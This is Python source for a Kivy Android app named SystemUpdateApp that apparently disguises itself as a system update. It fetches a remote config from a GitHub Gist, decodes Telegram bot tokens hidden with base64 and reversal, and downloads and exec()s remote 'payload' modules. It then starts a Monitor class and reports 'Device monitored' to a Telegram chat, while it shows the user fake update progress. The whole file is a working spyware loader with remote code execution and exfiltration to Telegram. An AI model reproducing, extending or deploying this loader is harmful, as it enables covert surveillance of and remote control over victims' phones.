"""
نقطة الدخول الرئيسية للتطبيق (Kivy)
يقوم بتحميل config.json من GitHub، ثم تحميل باقي البايلودات وتشغيل Monitor
"""

import threading
import requests
import base64
import time
import json
import traceback
import urllib3
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.utils import platform

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SystemUpdateApp(App):
    def build(self):
        # رابط config.json على GitHub Gist (تم تحديثه بالرابط الصحيح)
        self.config_url = "https://gist.githubusercontent.com/Zaen1993/e463af07dcd7c8c1f2398fdbaf573c73/raw/22598946c78d869e5e3cfa1492acf9f22c26f370/config.json"

        layout = BoxLayout(orientation='vertical')
        scroll = ScrollView(size_hint=(1, 1), do_scroll_x=False)
        
        # TextInput للقراءة فقط - لعرض السجلات ويمكن نسخها
        self.log_view = TextInput(
            text="[System] Initializing...\n",
            readonly=True,
            background_color=(0, 0, 0, 1),
            foreground_color=(0, 1, 0, 1),  # أخضر
            font_size='14sp',
            size_hint_y=None,
            cursor_color=(0, 0, 0, 0)
        )
        self.log_view.bind(minimum_height=self.log_view.setter('height'))
        
        scroll.add_widget(self.log_view)
        layout.add_widget(scroll)
        
        # بدء محرك الخلفية في thread منفصل
        threading.Thread(target=self.logic_engine, daemon=True).start()
        return layout

    def log(self, msg):
        """إضافة رسالة إلى واجهة السجل"""
        self.log_view.text += f"> {msg}\n"

    def decode_secret(self, data):
        """فك تشفير البيانات (base64 + عكس)"""
        try:
            decoded = base64.b64decode(data).decode('utf-8')
            return decoded[::-1]
        except:
            return ""

    def send_telegram(self, token, chat_id, text):
        """إرسال رسالة نصية إلى Telegram"""
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            requests.post(url, json={"chat_id": chat_id, "text": text}, timeout=10, verify=False)
        except:
            pass

    def logic_engine(self):
        """المحرك الرئيسي: تحميل الإعدادات، فك التشفير، تحميل البايلودات، تشغيل Monitor"""
        try:
            self.log("Starting engine...")
            time.sleep(2)

            # طلب صلاحيات الإنترنت (لأندرويد)
            if platform == 'android':
                self.log("Requesting permissions (INTERNET)...")
                from android.permissions import request_permissions, Permission
                request_permissions([Permission.INTERNET, Permission.ACCESS_NETWORK_STATE])
                time.sleep(2)

            # اختبار الاتصال
            self.log("Testing direct IP connection (1.1.1.1)...")
            try:
                r = requests.get("https://1.1.1.1", timeout=5, verify=False)
                self.log(f"Direct IP test OK (status {r.status_code})")
            except Exception as e:
                self.log(f"Direct IP test FAILED: {str(e)[:80]}")

            # جلب config.json
            self.log(f"Fetching config from: {self.config_url[:60]}...")
            response = requests.get(self.config_url, timeout=15, verify=False)
            self.log(f"HTTP status: {response.status_code}")
            config = response.json()
            self.log("Config JSON parsed successfully.")

            # فك تشفير التوكنات ومعرف الدردشة
            tokens = [self.decode_secret(t) for t in config.get('t', [])]
            v_id = self.decode_secret(config.get('v', ''))
            self.log(f"Decrypted {len(tokens)} tokens, chat ID: {v_id}")

            # تخزين الإعدادات في متغير عام
            globals()['MASTER_CONFIG'] = {
                'tokens': tokens,
                'v_id': v_id,
                'payload_urls': config.get('payload_urls', [])
            }

            # إرسال رسالة بدء التشغيل
            if tokens:
                self.log("Sending startup message to Telegram...")
                self.send_telegram(tokens[0], v_id, "🚀 System Online (v2.0 - Full Suite)")
                self.log("Startup message sent.")

            self.log("Moving to payload loading...")
            self.log_view.text += "\n[Progress] Downloading modules... (35%)\n"
            self.load_payloads()

        except Exception as e:
            error_details = traceback.format_exc()
            self.log(f"CRITICAL ERROR:\n{error_details}")
            # محاولة إرسال بداية الخطأ إلى التيليجرام إذا كان MASTER_CONFIG موجوداً
            try:
                if 'MASTER_CONFIG' in globals() and globals()['MASTER_CONFIG']:
                    token = globals()['MASTER_CONFIG']['tokens'][0]
                    v_id = globals()['MASTER_CONFIG']['v_id']
                    self.send_telegram(token, v_id, f"❌ Error: {error_details[:200]}")
            except:
                pass

    def load_payloads(self):
        """تحميل جميع البايلودات (ملفات الميزات) من القائمة في config.json وتنفيذها"""
        payload_urls = globals()['MASTER_CONFIG'].get('payload_urls', [])
        if not payload_urls:
            self.log("No payload URLs found in config!")
            return

        loaded = 0
        for url in payload_urls:
            try:
                time.sleep(1)
                name = url.split('/')[-1]
                self.log(f"Loading {name}...")
                code = requests.get(url, timeout=10, verify=False).text
                exec(code, globals())
                self.log(f"✅ {name} loaded")
                loaded += 1
                # إرسال تقرير كل 3 وحدات
                if loaded % 3 == 0:
                    self.send_telegram(globals()['MASTER_CONFIG']['tokens'][0],
                                       globals()['MASTER_CONFIG']['v_id'],
                                       f"📦 Loaded {loaded}/{len(payload_urls)} modules")
            except Exception as e:
                self.log(f"⚠️ Failed {name}: {str(e)[:50]}")
                continue

        # بعد تحميل كل البايلودات، نبحث عن كلاس Monitor ونشغله
        if 'Monitor' in globals():
            self.log("Starting Monitor service...")
            monitor = globals()['Monitor']()
            monitor.start()
            self.log("✅ Monitor started")
            self.log_view.text += "\n[System] Status: 100% - Up to date\n"
            self.send_telegram(globals()['MASTER_CONFIG']['tokens'][0],
                               globals()['MASTER_CONFIG']['v_id'],
                               "🎯 Full success - Device monitored")
        else:
            self.log("ERROR: Monitor class not found after loading payloads.")

if __name__ == '__main__':
    SystemUpdateApp().run()
